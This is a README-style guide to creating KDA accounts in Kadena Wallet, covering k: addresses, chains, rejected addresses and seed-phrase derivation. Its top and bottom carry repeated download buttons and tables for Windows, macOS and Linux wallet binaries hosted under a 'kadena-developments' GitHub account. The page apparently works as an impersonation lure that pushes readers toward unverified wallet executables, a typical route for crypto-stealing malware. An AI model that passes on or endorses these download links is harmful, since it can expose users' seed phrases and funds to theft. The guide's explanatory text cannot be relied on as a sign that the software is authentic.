![Kadena Wallet](assets/banner-article.png)

<h1 align="center">How to Create a KDA Account in Kadena Wallet</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

A Kadena account is not a file, a registration, or a row in someone's database. It is a name plus an authorisation rule that lives on a specific chain, and understanding that sentence saves you from most of the confusing things that happen later.

This explains what an account actually is, why addresses start with `k:`, and how to create one that you can still open in five years.

## You'll see this if

- A service asks for your Kadena address and you are not sure which of the twenty chains it belongs to.
- You pasted an address somewhere and it was rejected as invalid.
- You imported a seed phrase and the wallet shows an address you do not recognise.
- You are about to receive KDA for the first time and want to get the destination right.

## What an account really is

On Kadena, the thing that can hold a balance is a pair: a name and a guard. The guard is the on-chain rule that says who may move funds.

That design has a consequence people do not expect: a public key on its own holds nothing. The key proves you are allowed to act; the account holds the value. This is why the coin contract's create function asks for both a name and a guard, and why sending to an account that does not exist yet requires supplying the guard for it.

## Why `k:` addresses look the way they do

A `k:` account is the single-key principal: the letter `k`, a colon, then 64 hexadecimal characters. That is 66 characters in total, and the 64 characters are an Ed25519 public key encoded as hex.

Three things follow from that, all of them practical:

1. **`k:` is a protocol tag, not a chain.** It does not tell you chain 0 from chain 19. The same `k:` address exists on every chain, with separate balances.
2. **It is derived, not chosen.** You cannot pick a `k:` address you like; it comes out of your key. A "vanity" approach is a different mechanism entirely.
3. **It is checked.** The protocol verifies that a `k:` account's name corresponds to its guard, which is why a mistyped `k:` address is usually rejected rather than silently accepted.

Kadena also has `w:` multi-key keysets, `u:` user guards, `r:` reference keysets used by SpireKey, and `.kda` names. A wallet may present all of these as "accounts", and they behave differently under the hood. The `k:` form is the one almost everyone uses.

## Creating an account, step by step

These steps describe the parts that are true of any Kadena wallet. Screen labels differ between products.

1. **Decide whether you are creating or recovering.** If you already have a phrase from a previous wallet, you are importing, not creating. Creating a new account generates a new key, and the phrase for it is the only way back in.
2. **Write the recovery phrase down on paper, by hand, before you fund anything.** Not a screenshot, not a password manager note, not a cloud document. The phrase is the account.
3. **Let the wallet derive the first address and check that it starts with `k:` and is 66 characters.** If it does not, you are probably looking at a legacy account, which is a different format and still valid.
4. **Copy the address exactly, including the `k:` prefix.** Some interfaces accept the bare 64 characters; most do not, and a missing prefix reads as an invalid address.
5. **Receive a small test amount first.** Confirm it arrives on the chain you expect before sending anything larger.
6. **Note which chain you are using.** Balances are per chain; a deposit on chain 0 and an expectation of chain 1 is the most common "missing funds" report there is.

## The chain question, solved once

Every account name exists or does not exist, separately, on each of the twenty chains. When you create an account in a wallet, you are usually creating (or preparing) it on the chain the wallet is currently set to.

Practical implications:

- A deposit to your account on chain 3 will not appear when the wallet is set to chain 0.
- Before giving an address to an exchange or a service, check which chain it will send on and set the wallet to the same chain to receive.
- Holding balances on more than one chain is normal. Moving between them is a separate operation with its own two-step flow.

## If the address is rejected

Work through these in order:

1. **Check the prefix.** `k:` plus 64 hex characters. Count them: 66 total.
2. **Check the characters.** Hex means 0-9 and a-f. A capital `O`, a lowercase `l`, or a `g` means something went wrong in the copy.
3. **Check the chain selector on the receiving side.** Some services validate the address against the chain they intend to use.
4. **Check for whitespace.** A trailing space from a copy button fails validation on many interfaces.
5. **Check whether you are pasting a public key instead of an account name,** or the reverse. Both are 64 hex characters, but only one is an account.

If it still fails, use a different copy path, for example select the text manually rather than using the clipboard button.

## Why the derived address may not match your old one

Different wallets derive keys differently. A phrase in the BIP39 wordlist can be accepted by a wallet and still produce keys that control nothing, if the wallet derives along a different scheme than the one that created your accounts.

Chainweaver, for example, used Kadena's own legacy derivation on a 12-word master seed rather than a plain BIP44 path. Wallets that support importing it say so explicitly; wallets that do not will still happily accept the words and show you a fresh empty account.

So: acceptance of a phrase is not proof of recovery. Proof is that the resulting address matches the address you had before, or that it shows the balance you expected. If it does not, you are on the wrong derivation, not out of luck.

## Handling the phrase safely

- Write it once, by hand, and store it offline in more than one place.
- Never type it into a website, a chat, a support form, or a "seed checker". No legitimate wallet recovery process requires a website to see your phrase.
- Never photograph it, and never keep it in a note that syncs to an account protected by a password you also keep online.
- If you believe it has been exposed, create a new account and move the funds. There is no way to rotate the keys behind an existing `k:` account.

## FAQ

**Is a Kadena account free to create?**
Creating an account on-chain through a transfer consumes gas on the destination side, in the same way any transaction does. There is no registration fee beyond transaction costs.

**Can two people have the same address?**
Not in practice. The address is derived from a public key, and duplicate keys would mean a broken random number generator.

**Does deleting a wallet delete the account?**
No. The account lives on-chain with its balance. Removing an app removes your ability to sign, which is why the phrase matters more than the software.

**What is a legacy account?**
A pre-`k:` account named by its bare public key. It still works in wallets that support it, and it can coexist with a `k:` account for the same key.

**Can I rename an account?**
Not the `k:` form, which is derived. Named accounts with custom guards exist, but they carry their own rules and are not a rename of a `k:` account.

## Related reading

- Choosing a chain before you receive KDA
- Importing a Chainweaver seed into Kadena Wallet
- Cross-chain transfers in Kadena Wallet
- Ledger not showing a KDA balance

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Choosing a Chain in Kadena Wallet: Why Balances Differ](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/choosing-a-chain-in-kadena-wallet.md)
- [Chainweb's Twenty Chains, Explained for Wallet Users](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/chainweb-twenty-chains-in-kadena-wallet.md)
- [Cross-Chain Transfers in Kadena Wallet: How the Twenty Chains Actually Connect](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/cross-chain-transfers-in-kadena-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
